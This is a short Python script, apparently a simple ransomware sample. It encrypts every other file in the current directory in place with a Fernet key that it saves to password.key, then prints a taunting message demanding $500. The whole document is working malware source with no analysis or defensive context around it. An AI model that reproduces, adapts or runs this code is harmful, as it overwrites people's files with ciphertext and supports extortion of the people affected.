import os
from cryptography.fernet import Fernet

files = []

for entry in os.listdir():
    append_file = entry != "main.py" and os.path.isfile(entry) and entry != "password.key" and entry != "decrypt.py"
    
    if append_file:
        files.append(entry)

key = Fernet.generate_key()

with open("password.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as current_file:
        contents = current_file.read()

    encrypted_content = Fernet(key).encrypt(contents)

    with open(file, "wb") as file_to_encrypt:
        file_to_encrypt.write(encrypted_content)

print("Hahaha, I encypted your files! Give me the sweet money or else cry like a baby! 500$ should do it.")
